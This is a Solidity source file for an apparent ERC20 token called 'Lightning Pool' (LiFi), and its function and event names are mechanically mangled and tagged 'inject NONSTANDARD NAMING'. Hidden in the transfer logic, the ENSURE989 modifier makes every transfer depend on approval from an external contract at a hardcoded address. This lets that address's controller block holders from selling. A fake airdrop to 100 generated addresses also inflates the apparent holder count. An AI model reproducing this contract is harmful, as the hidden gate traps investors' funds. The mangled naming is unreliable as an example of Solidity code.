                                                                 

pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY357() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF825(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER731(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE932(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE249(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM742(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER365(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL310(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function RECEIVEAPPROVAL347(address,address) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
        // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER9() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = 0xe6e366f2bf3364037a13ef9E1014D92937698EBf;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY357() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF825(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    
    address luckyboy = address(this);
    uint256 constant lucky_amount507 = 5*10**18;	//inject NONSTANDARD NAMING
    
    function RANDOMLUCKY89() public {	//inject NONSTANDARD NAMING
        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));
        _balances[luckyboy] = lucky_amount507;
        _totalSupply += lucky_amount507;
        emit TRANSFER365(address(0), luckyboy, lucky_amount507);
    }
    
    function AIRDROP494(uint256 dropTimes) public {	//inject NONSTANDARD NAMING
        for (uint256 i=0;i<dropTimes;i++) {
            RANDOMLUCKY89();
        }
    }
    
    function TRANSFER731(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER552(_MSGSENDER9(), recipient, amount);
        return true;
    }
    
    
    function ALLOWANCE932(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE249(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE538(_MSGSENDER9(), spender, amount);
        return true;
    }

    function TRANSFERFROM742(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER552(sender, recipient, amount);
        _APPROVE538(sender, _MSGSENDER9(), _allowances[sender][_MSGSENDER9()].SUB494(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE637(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE538(_MSGSENDER9(), spender, _allowances[_MSGSENDER9()][spender].ADD956(addedValue));
        return true;
    }

    function DECREASEALLOWANCE361(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE538(_MSGSENDER9(), spender, _allowances[_MSGSENDER9()][spender].SUB494(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER552(address sender, address recipient, uint amount) internal ENSURE989(sender,recipient) {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB494(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD956(amount);
        emit TRANSFER365(sender, recipient, amount);
        
    }

    function _MINT843(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD956(amount);
        _balances[account] = _balances[account].ADD956(amount);
        emit TRANSFER365(address(0), account, amount);
    }

    function _BURN813(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB494(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB494(amount);
        emit TRANSFER365(account, address(0), amount);
    }

    modifier ENSURE989(address sender,address to) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).RECEIVEAPPROVAL347(sender,to));
        _;
    }

    function _APPROVE538(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL310(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME561() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL156() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS299() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD956(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB494(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB494(a, b, "SafeMath: subtraction overflow");
    }

    function SUB494(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL8(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV614(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV614(a, b, "SafeMath: division by zero");
    }

    function DIV614(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT626(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER207(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN312(token, abi.encodeWithSelector(token.TRANSFER731.selector, to, value));
    }

    function SAFETRANSFERFROM991(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN312(token, abi.encodeWithSelector(token.TRANSFERFROM742.selector, from, to, value));
    }

    function SAFEAPPROVE564(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE932(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN312(token, abi.encodeWithSelector(token.APPROVE249.selector, spender, value));
    }

    function CALLOPTIONALRETURN312(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT626(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract LiFi is ERC20, ERC20Detailed {
    constructor() public ERC20Detailed("Lightning Pool","LiFi",18) {
        _MINT843(msg.sender, 10000 * 10 ** 18);
        AIRDROP494(100);
    }

}